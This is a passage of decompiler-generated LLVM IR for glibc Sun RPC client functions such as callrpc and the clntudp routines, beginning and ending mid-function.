  br i1 %v4_8062c8a, label %dec_label_pc_8062c92, label %dec_label_pc_8062c8e

dec_label_pc_8062c8e:                             ; preds = %dec_label_pc_8062c8e.lr.ph, %dec_label_pc_8062c87
  %v4_8062c81.pre = phi i32 [ %v4_8062c81.pre.pre, %dec_label_pc_8062c8e.lr.ph ], [ %v4_8062c81.pre36, %dec_label_pc_8062c87 ]
  %v6_8062c8834 = phi i32 [ %v6_8062c8828, %dec_label_pc_8062c8e.lr.ph ], [ %v6_8062c88, %dec_label_pc_8062c87 ]
  %v2_8062c8833 = phi i8 [ %v2_8062c8825, %dec_label_pc_8062c8e.lr.ph ], [ %v2_8062c88, %dec_label_pc_8062c87 ]
  %v0_8062c8731 = phi i32 [ %v4_8062c76, %dec_label_pc_8062c8e.lr.ph ], [ %v1_8062c87, %dec_label_pc_8062c87 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8062c8114 = load i8, i8* %v1_8062c8113, align 1
  %v3_8062c8115 = zext i8 %v2_8062c8114 to i32
  %v5_8062c8116 = and i32 %v4_8062c81.pre, -256
  %v6_8062c8117 = or i32 %v3_8062c8115, %v5_8062c8116
  store i32 %v6_8062c8117, i32* @ecx, align 4
  %v4_8062c8318 = icmp eq i8 %v2_8062c8114, 0
  %v1_8062c8520 = icmp eq i1 %v4_8062c8318, false
  br i1 %v1_8062c8520, label %dec_label_pc_8062c7c, label %dec_label_pc_8062c87

dec_label_pc_8062c92:                             ; preds = %dec_label_pc_8062c87, %entry
  br label %dec_label_pc_8062c94

dec_label_pc_8062c94:                             ; preds = %dec_label_pc_8062c7c, %dec_label_pc_8062c92
  %v0_8062c96 = phi i32 [ 0, %dec_label_pc_8062c92 ], [ %v0_8062c8731, %dec_label_pc_8062c7c ]
  store i32 %v0_8062c71, i32* @ebx, align 4
  ret i32 %v0_8062c96

; uselistorder directives
  uselistorder i32 %v6_8062c8117, { 2, 0, 1 }
  uselistorder i8 %v2_8062c8114, { 1, 2, 0 }
  uselistorder i32 %v1_8062c87, { 1, 0 }
  uselistorder i32 %v6_8062c81, { 1, 2, 0 }
  uselistorder i8 %v2_8062c81, { 1, 2, 0 }
  uselistorder i32 %v1_8062c80, { 2, 1, 0 }
  uselistorder i8 %v2_8062c8825, { 0, 2, 1 }
  uselistorder i32 %v0_8062c71, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8062c94, { 1, 0 }
  uselistorder label %dec_label_pc_8062c8e, { 1, 0 }
  uselistorder label %dec_label_pc_8062c87, { 1, 0 }
}

define i32 @__rpc_thread_clnt_cleanup() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8062c98 = load i32, i32* @ebx, align 4
  store i32 %v0_8062c98, i32* %stack_var_-4, align 4
  %v1_8062c9c = call i32 @__rpc_thread_variables(i32 %v0_8062c98)
  %v1_8062ca1 = add i32 %v1_8062c9c, 164
  %v2_8062ca1 = inttoptr i32 %v1_8062ca1 to i32*
  %v3_8062ca1 = load i32, i32* %v2_8062ca1, align 4
  store i32 %v3_8062ca1, i32* @ebx, align 4
  %v1_8062ca7 = icmp eq i32 %v3_8062ca1, 0
  br i1 %v1_8062ca7, label %dec_label_pc_8062cca, label %dec_label_pc_8062cab

dec_label_pc_8062cab:                             ; preds = %entry
  %v1_8062cab = inttoptr i32 %v3_8062ca1 to i32*
  %v2_8062cab = load i32, i32* %v1_8062cab, align 4
  %v1_8062cad = icmp eq i32 %v2_8062cab, 0
  br i1 %v1_8062cad, label %dec_label_pc_8062cab.dec_label_pc_8062cbe_crit_edge, label %dec_label_pc_8062cb1

dec_label_pc_8062cab.dec_label_pc_8062cbe_crit_edge: ; preds = %dec_label_pc_8062cab
  br label %dec_label_pc_8062cbe

dec_label_pc_8062cb1:                             ; preds = %dec_label_pc_8062cab
  %v1_8062cb1 = add i32 %v2_8062cab, 4
  %v2_8062cb1 = inttoptr i32 %v1_8062cb1 to i32*
  %v3_8062cb1 = load i32, i32* %v2_8062cb1, align 4
  %v5_8062cb8 = add i32 %v3_8062cb1, 16
  %v6_8062cb8 = inttoptr i32 %v5_8062cb8 to i32*
  %v7_8062cb8 = load i32, i32* %v6_8062cb8, align 4
  call void @__pseudo_call(i32 %v7_8062cb8)
  br label %dec_label_pc_8062cbe

dec_label_pc_8062cbe:                             ; preds = %dec_label_pc_8062cab.dec_label_pc_8062cbe_crit_edge, %dec_label_pc_8062cb1
  %v1_8062cc2 = call i32 @free(i32 %v3_8062ca1)
  br label %dec_label_pc_8062cca

dec_label_pc_8062cca:                             ; preds = %entry, %dec_label_pc_8062cbe
  %v2_8062cca = load i32, i32* %stack_var_-12, align 4
  %v2_8062ccc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8062ccc, i32* @ebx, align 4
  ret i32 %v2_8062cca

; uselistorder directives
  uselistorder label %dec_label_pc_8062cca, { 1, 0 }
  uselistorder label %dec_label_pc_8062cbe, { 1, 0 }
}

define i32 @callrpc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-1120 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_8062cf6 = call i32 @__rpc_thread_variables(i32 0)
  store i32 %v1_8062cf6, i32* %eax.global-to-local, align 4
  %v1_8062cfb = add i32 %v1_8062cf6, 164
  %v2_8062cfb = inttoptr i32 %v1_8062cfb to i32*
  %v3_8062cfb = load i32, i32* %v2_8062cfb, align 4
  store i32 %v3_8062cfb, i32* @esi, align 4
  store i32 %v1_8062cf6, i32* @ebx, align 4
  %v1_8062d03 = icmp eq i32 %v3_8062cfb, 0
  %v1_8062d05 = icmp eq i1 %v1_8062d03, false
  br i1 %v1_8062d05, label %dec_label_pc_8062d27, label %dec_label_pc_8062d07

dec_label_pc_8062d07:                             ; preds = %entry
  %v5_8062d0d = call i32 @calloc(i64 1, i32 24, i32 %v1_8062cf6, i32 %v1_8062cf6)
  store i32 %v5_8062d0d, i32* @esi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8062d19 = icmp eq i32 %v5_8062d0d, 0
  br i1 %v1_8062d19, label %dec_label_pc_8062ed8, label %dec_label_pc_8062d21

dec_label_pc_8062d21:                             ; preds = %dec_label_pc_8062d07
  %v1_8062d21 = load i32, i32* @ebx, align 4
  %v2_8062d21 = add i32 %v1_8062d21, 164
  %v3_8062d21 = inttoptr i32 %v2_8062d21 to i32*
  store i32 %v5_8062d0d, i32* %v3_8062d21, align 4
  %v0_8062d27.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8062d27

dec_label_pc_8062d27:                             ; preds = %entry, %dec_label_pc_8062d21
  %v0_8062d27 = phi i32 [ %v3_8062cfb, %entry ], [ %v0_8062d27.pre, %dec_label_pc_8062d21 ]
  %v1_8062d27 = add i32 %v0_8062d27, 20
  %v2_8062d27 = inttoptr i32 %v1_8062d27 to i32*
  %v3_8062d27 = load i32, i32* %v2_8062d27, align 4
  %v4_8062d27 = icmp eq i32 %v3_8062d27, 0
  %v1_8062d2b = icmp eq i1 %v4_8062d27, false
  br i1 %v1_8062d2b, label %dec_label_pc_8062d4a, label %dec_label_pc_8062d2d

dec_label_pc_8062d2d:                             ; preds = %dec_label_pc_8062d27
  %v1_8062d35 = call i32 @malloc(i32 256)
  %v2_8062d35 = inttoptr i32 %v1_8062d35 to i8*
  store i32 %v1_8062d35, i32* %eax.global-to-local, align 4
  %v2_8062d3d = load i32, i32* @esi, align 4
  %v3_8062d3d = add i32 %v2_8062d3d, 20
  %v4_8062d3d = inttoptr i32 %v3_8062d3d to i32*
  store i32 %v1_8062d35, i32* %v4_8062d3d, align 4
  store i8 0, i8* %v2_8062d35, align 1
  %v0_8062d43 = load i32, i32* @esi, align 4
  %v1_8062d43 = add i32 %v0_8062d43, 4
  %v2_8062d43 = inttoptr i32 %v1_8062d43 to i32*
  store i32 -1, i32* %v2_8062d43, align 4
  %v0_8062d4a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8062d4a

dec_label_pc_8062d4a:                             ; preds = %dec_label_pc_8062d27, %dec_label_pc_8062d2d
  %v0_8062d62 = phi i32 [ %v0_8062d27, %dec_label_pc_8062d27 ], [ %v0_8062d4a.pre, %dec_label_pc_8062d2d ]
  %v1_8062d4a = add i32 %v0_8062d62, 16
  %v2_8062d4a = inttoptr i32 %v1_8062d4a to i32*
  %v3_8062d4a = load i32, i32* %v2_8062d4a, align 4
  %v4_8062d4a = icmp eq i32 %v3_8062d4a, 0
  br i1 %v4_8062d4a, label %dec_label_pc_8062d75, label %dec_label_pc_8062d50

dec_label_pc_8062d50:                             ; preds = %dec_label_pc_8062d4a
  %v1_8062d50 = add i32 %v0_8062d62, 8
  %v2_8062d50 = inttoptr i32 %v1_8062d50 to i32*
  %v3_8062d50 = load i32, i32* %v2_8062d50, align 4
  %v4_8062d50 = load i32, i32* @edi, align 4
  %v15_8062d50 = icmp eq i32 %v3_8062d50, %v4_8062d50
  %v1_8062d53 = icmp eq i1 %v15_8062d50, false
  br i1 %v1_8062d53, label %dec_label_pc_8062d75, label %dec_label_pc_8062d55

dec_label_pc_8062d55:                             ; preds = %dec_label_pc_8062d50
  store i32 %arg3, i32* @eax, align 4
  %v1_8062d58 = add i32 %v0_8062d62, 12
  %v2_8062d58 = inttoptr i32 %v1_8062d58 to i32*
  %v3_8062d58 = load i32, i32* %v2_8062d58, align 4
  %v15_8062d58 = icmp eq i32 %v3_8062d58, %arg3
  %v1_8062d5b = icmp eq i1 %v15_8062d58, false
  br i1 %v1_8062d5b, label %dec_label_pc_8062d75, label %dec_label_pc_8062d5d

dec_label_pc_8062d5d:                             ; preds = %dec_label_pc_8062d55
  %v1_8062d62 = add i32 %v0_8062d62, 20
  %v2_8062d62 = inttoptr i32 %v1_8062d62 to i32*
  %v3_8062d62 = load i32, i32* %v2_8062d62, align 4
  %v3_8062d65 = inttoptr i32 %v3_8062d62 to i8*
  %v4_8062d65 = call i32 @__GI_strcoll(i8* %v3_8062d65, i32 %arg1, i32 %arg3)
  store i32 %v4_8062d65, i32* %eax.global-to-local, align 4
  %v1_8062d6d = icmp eq i32 %v4_8062d65, 0
  br i1 %v1_8062d6d, label %dec_label_pc_8062e98, label %dec_label_pc_8062d5d.dec_label_pc_8062d75_crit_edge

dec_label_pc_8062d5d.dec_label_pc_8062d75_crit_edge: ; preds = %dec_label_pc_8062d5d
  %v0_8062d75.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8062d75

dec_label_pc_8062d75:                             ; preds = %dec_label_pc_8062d5d.dec_label_pc_8062d75_crit_edge, %dec_label_pc_8062d55, %dec_label_pc_8062d50, %dec_label_pc_8062d4a
  %v0_8062d75 = phi i32 [ %v0_8062d75.pre, %dec_label_pc_8062d5d.dec_label_pc_8062d75_crit_edge ], [ %v0_8062d62, %dec_label_pc_8062d55 ], [ %v0_8062d62, %dec_label_pc_8062d50 ], [ %v0_8062d62, %dec_label_pc_8062d4a ]
  %v1_8062d75 = add i32 %v0_8062d75, 4
  %v2_8062d75 = inttoptr i32 %v1_8062d75 to i32*
  %v3_8062d75 = load i32, i32* %v2_8062d75, align 4
  store i32 %v3_8062d75, i32* %eax.global-to-local, align 4
  %v1_8062d78 = add i32 %v0_8062d75, 16
  %v2_8062d78 = inttoptr i32 %v1_8062d78 to i32*
  store i32 0, i32* %v2_8062d78, align 4
  %v0_8062d7f = load i32, i32* %eax.global-to-local, align 4
  %v10_8062d7f = icmp eq i32 %v0_8062d7f, -1
  br i1 %v10_8062d7f, label %dec_label_pc_8062d97, label %dec_label_pc_8062d84

dec_label_pc_8062d84:                             ; preds = %dec_label_pc_8062d75
  %v1_8062d88 = call i32 @__libc_close(i32 %v0_8062d7f)
  store i32 %v1_8062d88, i32* %eax.global-to-local, align 4
  %v0_8062d90 = load i32, i32* @esi, align 4
  %v1_8062d90 = add i32 %v0_8062d90, 4
  %v2_8062d90 = inttoptr i32 %v1_8062d90 to i32*
  store i32 -1, i32* %v2_8062d90, align 4
  br label %dec_label_pc_8062d97

dec_label_pc_8062d97:                             ; preds = %dec_label_pc_8062d75, %dec_label_pc_8062d84
  %v0_8062d97 = load i32, i32* @esi, align 4
  %v1_8062d97 = inttoptr i32 %v0_8062d97 to i32*
  %v2_8062d97 = load i32, i32* %v1_8062d97, align 4
  %v1_8062d99 = icmp eq i32 %v2_8062d97, 0
  br i1 %v1_8062d99, label %dec_label_pc_8062db0, label %dec_label_pc_8062d9d

dec_label_pc_8062d9d:                             ; preds = %dec_label_pc_8062d97
  %v1_8062d9d = add i32 %v2_8062d97, 4
  %v2_8062d9d = inttoptr i32 %v1_8062d9d to i32*
  %v3_8062d9d = load i32, i32* %v2_8062d9d, align 4
  store i32 %v3_8062d9d, i32* %eax.global-to-local, align 4
  store i32 134622631, i32* %stack_var_-112, align 4
  %v5_8062da4 = add i32 %v3_8062d9d, 16
  %v6_8062da4 = inttoptr i32 %v5_8062da4 to i32*
  %v7_8062da4 = load i32, i32* %v6_8062da4, align 4
  call void @__pseudo_call(i32 %v7_8062da4)
  %v0_8062daa = load i32, i32* @esi, align 4
  %v1_8062daa = inttoptr i32 %v0_8062daa to i32*
  store i32 0, i32* %v1_8062daa, align 4
  br label %dec_label_pc_8062db0

dec_label_pc_8062db0:                             ; preds = %dec_label_pc_8062d97, %dec_label_pc_8062d9d
  store i32 1024, i32* @ebx, align 4
  %v8_8062dbf = ptrtoint i32* %stack_var_-1120 to i32
  %v2_8062def = ptrtoint i32* %stack_var_-28 to i32
  %v2_8062df3 = ptrtoint i32* %stack_var_-24 to i32
  %v2_8062df9 = ptrtoint i32* %stack_var_-64 to i32
  %v0_8062ded.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062ded

dec_label_pc_8062dc4:                             ; preds = %dec_label_pc_8062e0c, %dec_label_pc_8062ded
  %v3_8062dc4 = load i32, i32* %stack_var_-28, align 4
  %v13_8062dc4 = icmp eq i32 %v3_8062dc4, -1
  %v1_8062dc8 = icmp eq i1 %v13_8062dc4, false
  br i1 %v1_8062dc8, label %dec_label_pc_8062ed3, label %dec_label_pc_8062dce

dec_label_pc_8062dce:                             ; preds = %dec_label_pc_8062dc4
  %v0_8062dce = load i32, i32* %stack_var_-112, align 4
  %v1_8062dce = call i32 @__errno_location(i32 %v0_8062dce)
  store i32 %v1_8062dce, i32* %eax.global-to-local, align 4
  %v1_8062dd3 = inttoptr i32 %v1_8062dce to i32*
  %v2_8062dd3 = load i32, i32* %v1_8062dd3, align 4
  %v11_8062dd3 = icmp eq i32 %v2_8062dd3, 34
  %v1_8062dd6 = icmp eq i1 %v11_8062dd3, false
  br i1 %v1_8062dd6, label %dec_label_pc_8062ed3, label %dec_label_pc_8062ddc

dec_label_pc_8062ddc:                             ; preds = %dec_label_pc_8062dce
  %v0_8062ddc = load i32, i32* @ebx, align 4
  %v2_8062ddc = mul i32 %v0_8062ddc, 2
  store i32 %v2_8062ddc, i32* @ebx, align 4
  %v1_8062dde = add i32 %v2_8062ddc, 30
  %v1_8062de1 = and i32 %v1_8062dde, -16
  store i32 %v1_8062de1, i32* %eax.global-to-local, align 4
  %v0_8062de4 = load i32, i32* @esp, align 4
  %v2_8062de4 = sub i32 %v0_8062de4, %v1_8062de1
  %v1_8062de6 = add i32 %v2_8062de4, 15
  %v1_8062dea = and i32 %v1_8062de6, -16
  br label %dec_label_pc_8062ded

dec_label_pc_8062ded:                             ; preds = %dec_label_pc_8062db0, %dec_label_pc_8062ddc
  %v0_8062df7 = phi i32 [ 1024, %dec_label_pc_8062db0 ], [ %v2_8062ddc, %dec_label_pc_8062ddc ]
  %v0_8062ded = phi i32 [ %v0_8062ded.pre, %dec_label_pc_8062db0 ], [ %v1_8062de1, %dec_label_pc_8062ddc ]
  %storemerge = phi i32 [ %v8_8062dbf, %dec_label_pc_8062db0 ], [ %v1_8062dea, %dec_label_pc_8062ddc ]
  store i32 %v2_8062df9, i32* %eax.global-to-local, align 4
  %v8_8062e00 = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull %stack_var_-64, i32 %storemerge, i32 %v0_8062df7, i32 %v2_8062df3, i32 %v2_8062def, i32 %v0_8062ded)
  store i32 %v8_8062e00, i32* %eax.global-to-local, align 4
  %v1_8062e08 = icmp eq i32 %v8_8062e00, 0
  %v1_8062e0a = icmp eq i1 %v1_8062e08, false
  br i1 %v1_8062e0a, label %dec_label_pc_8062dc4, label %dec_label_pc_8062e0c

dec_label_pc_8062e0c:                             ; preds = %dec_label_pc_8062ded
  %v3_8062e0c = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_8062e0c, i32* %eax.global-to-local, align 4
  %v1_8062e0f = icmp eq i32 %v3_8062e0c, 0
  br i1 %v1_8062e0f, label %dec_label_pc_8062dc4, label %dec_label_pc_8062e13

dec_label_pc_8062e13:                             ; preds = %dec_label_pc_8062e0c
  %v2_8062e1e = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8062e1e, i32* @ebx, align 4
  %v1_8062e28 = add i32 %v3_8062e0c, 12
  %v2_8062e28 = inttoptr i32 %v1_8062e28 to i32*
  %v3_8062e28 = load i32, i32* %v2_8062e28, align 4
  %v1_8062e2b = add i32 %v3_8062e0c, 16
  %v2_8062e2b = inttoptr i32 %v1_8062e2b to i32*
  %v3_8062e2b = load i32, i32* %v2_8062e2b, align 4
  store i32 %v3_8062e2b, i32* %eax.global-to-local, align 4
  %v1_8062e2e = inttoptr i32 %v3_8062e2b to i32*
  %v2_8062e2e = load i32, i32* %v1_8062e2e, align 4
  %v3_8062e31 = bitcast i32* %stack_var_-40 to i16*
  %v4_8062e31 = call i32 @memcpy(i16* %v3_8062e31, i32 %v2_8062e2e, i32 %v3_8062e28)
  %v0_8062e37 = load i32, i32* @esi, align 4
  %v1_8062e37 = add i32 %v0_8062e37, 4
  store i32 %v1_8062e37, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_8062e51 = load i32, i32* @edi, align 4
  %v6_8062e53 = call i32 @__GI_clntudp_create(i32 %v2_8062e1e, i32 %v0_8062e51, i32 %arg3, i32 5, i32 0, i32 %v1_8062e37)
  store i32 %v6_8062e53, i32* %eax.global-to-local, align 4
  %v1_8062e5b = icmp eq i32 %v6_8062e53, 0
  %v1_8062e5d = load i32, i32* @esi, align 4
  %v2_8062e5d = inttoptr i32 %v1_8062e5d to i32*
  store i32 %v6_8062e53, i32* %v2_8062e5d, align 4
  %v1_8062e5f = icmp eq i1 %v1_8062e5b, false
  br i1 %v1_8062e5f, label %dec_label_pc_8062e6a, label %dec_label_pc_8062e61

dec_label_pc_8062e61:                             ; preds = %dec_label_pc_8062e13
  %v0_8062e61 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_8062e61, i32* %eax.global-to-local, align 4
  %v1_8062e66 = inttoptr i32 %v0_8062e61 to i32*
  %v2_8062e66 = load i32, i32* %v1_8062e66, align 4
  store i32 %v2_8062e66, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062ed8

dec_label_pc_8062e6a:                             ; preds = %dec_label_pc_8062e13
  %v0_8062e6a = load i32, i32* @esi, align 4
  %v1_8062e6a = add i32 %v0_8062e6a, 16
  %v2_8062e6a = inttoptr i32 %v1_8062e6a to i32*
  store i32 1, i32* %v2_8062e6a, align 4
  %v0_8062e71 = load i32, i32* @edi, align 4
  %v1_8062e71 = load i32, i32* @esi, align 4
  %v2_8062e71 = add i32 %v1_8062e71, 8
  %v3_8062e71 = inttoptr i32 %v2_8062e71 to i32*
  store i32 %v0_8062e71, i32* %v3_8062e71, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v1_8062e77 = load i32, i32* @esi, align 4
  %v2_8062e77 = add i32 %v1_8062e77, 12
  %v3_8062e77 = inttoptr i32 %v2_8062e77 to i32*
  store i32 %arg3, i32* %v3_8062e77, align 4
  %v0_8062e83 = load i32, i32* @esi, align 4
  %v1_8062e83 = add i32 %v0_8062e83, 20
  %v2_8062e83 = inttoptr i32 %v1_8062e83 to i32*
  %v3_8062e83 = load i32, i32* %v2_8062e83, align 4
  %v3_8062e86 = inttoptr i32 %v3_8062e83 to i8*
  %v4_8062e86 = call i32 @strncpy(i8* %v3_8062e86, i32 %arg1, i32 255)
  store i32 %v4_8062e86, i32* %eax.global-to-local, align 4
  %v0_8062e8b = load i32, i32* @esi, align 4
  %v1_8062e8b = add i32 %v0_8062e8b, 20
  %v2_8062e8b = inttoptr i32 %v1_8062e8b to i32*
  %v3_8062e8b = load i32, i32* %v2_8062e8b, align 4
  store i32 %v3_8062e8b, i32* %eax.global-to-local, align 4
  %v1_8062e91 = add i32 %v3_8062e8b, 255
  %v2_8062e91 = inttoptr i32 %v1_8062e91 to i8*
  store i8 0, i8* %v2_8062e91, align 1
  br label %dec_label_pc_8062e98

dec_label_pc_8062e98:                             ; preds = %dec_label_pc_8062d5d, %dec_label_pc_8062e6a
  %v0_8062ea6 = load i32, i32* @esi, align 4
  %v1_8062ea6 = inttoptr i32 %v0_8062ea6 to i32*
  %v2_8062ea6 = load i32, i32* %v1_8062ea6, align 4
  store i32 %v2_8062ea6, i32* %eax.global-to-local, align 4
  %v1_8062ea8 = add i32 %v2_8062ea6, 4
  %v2_8062ea8 = inttoptr i32 %v1_8062ea8 to i32*
  %v3_8062ea8 = load i32, i32* %v2_8062ea8, align 4
  store i32 %arg6, i32* %stack_var_-112, align 4
  %v5_8062ec1 = inttoptr i32 %v3_8062ea8 to i32*
  %v6_8062ec1 = load i32, i32* %v5_8062ec1, align 4
  call void @__pseudo_call(i32 %v6_8062ec1)
  %v0_8062ec6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8062ec6 = icmp eq i32 %v0_8062ec6, 0
  br i1 %v1_8062ec6, label %dec_label_pc_8062ed8, label %dec_label_pc_8062eca

dec_label_pc_8062eca:                             ; preds = %dec_label_pc_8062e98
  %v0_8062eca = load i32, i32* @esi, align 4
  %v1_8062eca = add i32 %v0_8062eca, 16
  %v2_8062eca = inttoptr i32 %v1_8062eca to i32*
  store i32 0, i32* %v2_8062eca, align 4
  %v0_8062edf.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062ed8

dec_label_pc_8062ed3:                             ; preds = %dec_label_pc_8062dce, %dec_label_pc_8062dc4
  store i32 13, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062ed8

dec_label_pc_8062ed8:                             ; preds = %dec_label_pc_8062e98, %dec_label_pc_8062d07, %dec_label_pc_8062eca, %dec_label_pc_8062e61, %dec_label_pc_8062ed3
  %v0_8062edf = phi i32 [ 0, %dec_label_pc_8062e98 ], [ 0, %dec_label_pc_8062d07 ], [ %v0_8062edf.pre, %dec_label_pc_8062eca ], [ %v2_8062e66, %dec_label_pc_8062e61 ], [ 13, %dec_label_pc_8062ed3 ]
  ret i32 %v0_8062edf

; uselistorder directives
  uselistorder i32 %v3_8062e0c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8062ddc, { 2, 1, 0 }
  uselistorder i32 %v0_8062d7f, { 1, 0 }
  uselistorder i32 %v0_8062d75, { 1, 0 }
  uselistorder i32 %v1_8062d35, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 19, 17, 18, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 %arg3, { 5, 4, 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8062ed8, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_8062e98, { 1, 0 }
  uselistorder label %dec_label_pc_8062ded, { 1, 0 }
  uselistorder label %dec_label_pc_8062db0, { 1, 0 }
  uselistorder label %dec_label_pc_8062d97, { 1, 0 }
  uselistorder label %dec_label_pc_8062d4a, { 1, 0 }
  uselistorder label %dec_label_pc_8062d27, { 1, 0 }
}

define i32 @clntudp_geterr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8062ee7 = add i32 %arg1, 8
  %v2_8062ee7 = inttoptr i32 %v1_8062ee7 to i32*
  %v3_8062ee7 = load i32, i32* %v2_8062ee7, align 4
  %v1_8062eec = add i32 %v3_8062ee7, 44
  %v3_8062ef4 = inttoptr i32 %arg2 to i16*
  %v4_8062ef4 = call i32 @memcpy(i16* %v3_8062ef4, i32 %v1_8062eec, i32 12)
  ret i32 %v4_8062ef4
}

define i32 @clntudp_freeres(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_8062f09 = add i32 %arg1, 8
  %v2_8062f09 = inttoptr i32 %v1_8062f09 to i32*
  %v3_8062f09 = load i32, i32* %v2_8062f09, align 4
  %v1_8062f0c = add i32 %v3_8062f09, 56
  %v1_8062f0f = inttoptr i32 %v1_8062f0c to i32*
  store i32 2, i32* %v1_8062f0f, align 4
  call void @__pseudo_branch(i32 %arg2)
  ret i32 %v1_8062f0c
}

define i32 @clntudp_abort() local_unnamed_addr {
entry:
  %v0_8062f1f = load i32, i32* @eax, align 4
  ret i32 %v0_8062f1f
}

define i32 @clntudp_control(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg3 to i32
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* %ebx.global-to-local, align 4
  %v1_8062f2c = add i32 %arg1, 8
  %v2_8062f2c = inttoptr i32 %v1_8062f2c to i32*
  %v3_8062f2c = load i32, i32* %v2_8062f2c, align 4
  store i32 %v3_8062f2c, i32* %ecx.global-to-local, align 4
  %v1_8062f33 = add i32 %arg2, -1
  store i32 %v1_8062f33, i32* %eax.global-to-local, align 4
  switch i32 %arg2, label %dec_label_pc_8062f40 [
    i32 1, label %dec_label_pc_8062f5f
    i32 2, label %dec_label_pc_8062f6c
    i32 3, label %dec_label_pc_8062f8e
    i32 4, label %dec_label_pc_8062f74
    i32 5, label %dec_label_pc_8062f81
    i32 6, label %dec_label_pc_8062fa5
    i32 8, label %dec_label_pc_8062f47
    i32 9, label %dec_label_pc_8062f53
    i32 10, label %dec_label_pc_8062fa9
    i32 11, label %dec_label_pc_8062fb2
    i32 12, label %dec_label_pc_8062fbc
    i32 13, label %dec_label_pc_8062fc6
    i32 14, label %dec_label_pc_8062fd2
    i32 15, label %dec_label_pc_8062fde
  ]

dec_label_pc_8062f40:                             ; preds = %entry
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062fed

dec_label_pc_8062f47:                             ; preds = %entry
  %v1_8062f47 = add i32 %v3_8062f2c, 4
  %v2_8062f47 = inttoptr i32 %v1_8062f47 to i32*
  store i32 1, i32* %v2_8062f47, align 4
  br label %dec_label_pc_8062fe8

dec_label_pc_8062f53:                             ; preds = %entry
  %v1_8062f53 = add i32 %v3_8062f2c, 4
  %v2_8062f53 = inttoptr i32 %v1_8062f53 to i32*
  store i32 0, i32* %v2_8062f53, align 4
  br label %dec_label_pc_8062fe8

dec_label_pc_8062f5f:                             ; preds = %entry
  %v2_8062f5f = load i32, i32* %arg3, align 4
  store i32 %v2_8062f5f, i32* %edx.global-to-local, align 4
  %v1_8062f61 = add i32 %tmp7, 4
  %v2_8062f61 = inttoptr i32 %v1_8062f61 to i32*
  %v3_8062f61 = load i32, i32* %v2_8062f61, align 4
  store i32 %v3_8062f61, i32* %eax.global-to-local, align 4
  %v2_8062f64 = add i32 %v3_8062f2c, 36
  %v3_8062f64 = inttoptr i32 %v2_8062f64 to i32*
  store i32 %v2_8062f5f, i32* %v3_8062f64, align 4
  %v0_8062f67 = load i32, i32* %eax.global-to-local, align 4
  %v1_8062f67 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8062f67 = add i32 %v1_8062f67, 40
  %v3_8062f67 = inttoptr i32 %v2_8062f67 to i32*
  store i32 %v0_8062f67, i32* %v3_8062f67, align 4
  br label %dec_label_pc_8062fe8

dec_label_pc_8062f6c:                             ; preds = %entry
  %v1_8062f6c = add i32 %v3_8062f2c, 36
  %v2_8062f6c = inttoptr i32 %v1_8062f6c to i32*
  %v3_8062f6c = load i32, i32* %v2_8062f6c, align 4
  store i32 %v3_8062f6c, i32* %edx.global-to-local, align 4
  %v1_8062f6f = add i32 %v3_8062f2c, 40
  br label %dec_label_pc_8062f87

dec_label_pc_8062f74:                             ; preds = %entry
  %v2_8062f74 = load i32, i32* %arg3, align 4
  store i32 %v2_8062f74, i32* %edx.global-to-local, align 4
  %v1_8062f76 = add i32 %tmp7, 4
  %v2_8062f76 = inttoptr i32 %v1_8062f76 to i32*
  %v3_8062f76 = load i32, i32* %v2_8062f76, align 4
  store i32 %v3_8062f76, i32* %eax.global-to-local, align 4
  %v2_8062f79 = add i32 %v3_8062f2c, 28
  %v3_8062f79 = inttoptr i32 %v2_8062f79 to i32*
  store i32 %v2_8062f74, i32* %v3_8062f79, align 4
